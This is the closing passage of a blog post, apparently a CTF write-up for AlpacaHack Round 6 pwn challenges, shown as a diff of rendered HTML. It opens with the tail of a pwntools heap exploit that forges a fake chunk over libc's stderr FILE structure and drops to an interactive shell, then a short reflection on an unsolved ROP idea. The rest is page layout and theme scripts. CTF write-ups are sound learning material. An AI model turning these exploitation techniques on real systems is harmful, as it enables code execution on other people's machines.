<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(libc_IO21stderr - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(libcbase + <span class="number">0x217080</span>) <span class="comment"># _IO_wfile_jumps - 0x40</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>, payload[:-<span class="number">1</span>]) <span class="comment"># get fake chunk</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKLIBC&quot;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LIBCBASE&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKHEAP&quot;</span>,<span class="built_in">hex</span>(leakheap))</span><br><span class="line">NAUPINFO(<span class="string">&quot;Fakechunk&quot;</span>,<span class="built_in">hex</span>(fake_chunk))</span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="after-all"><a href="#after-all" class="headerlink" title="after all"></a>after all</h2><p>其實 alpacahack 的 pwn 感覺不難，完成這三題大概花了 6~7 小時左右，主要是排 heap 踩了些坑<br>第三題只有看出一個 Null byte overflow，在 stack 上，大致想法是將 rbp 修小，讓 return address 變到一個可控的位置，就可以打 ROP 了，不過一直沒有 exploit 出來<br>如果有人想討論題目歡迎私訊</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/LinuxKernelPwn/linuxkernel.png" data-sizes="auto" alt="Linux-Kernel-Pwn-EBH" class="lazyload">
+      
+      <a href="/2025/03/02/Linux-Kernel-Pwn-EBH/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Linux-Kernel-Pwn-EBH
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        156.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        13:43
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AlpacaHack-Round-6-Pwn-writeup"><span class="toc-number">1.</span> <span class="toc-text">AlpacaHack Round 6 (Pwn) - writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#inbound"><span class="toc-number">1.1.</span> <span class="toc-text">inbound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#catcpy"><span class="toc-number">1.2.</span> <span class="toc-text">catcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ideabook"><span class="toc-number">1.3.</span> <span class="toc-text">ideabook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">1.4.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">61</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "AlpacaHack Round 6 (Pwn) - writeup",
+          url: "http://example.com/2025/03/06/alpacahack-round6-pwn-writeup/",
+          excerpt: "",
+          description: "",
+          stripContent: "AlpacaHack Round 6 (Pwn) - writeup Author: 堇姬Naup  最近看到來賽後挑戰一下，除了第三題外都有打出來簡單記錄一下 inboundoob 寫 GOT 成 win function  1234567891011121314151617181920212223from pwn import *r=process(&amp;quot;./inbound&amp;quot;)r=remote(&amp;quot;34.170.146.252&amp;quot;, 39404)win = 0",
+          date: "Thu Mar 06 2025 19:47:49 GMT+0800",
+          updated: "Thu Mar 06 2025 19:51:38 GMT+0800",
+          cover: "/images/posts_cover/alpacahack/alpacahack.png",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
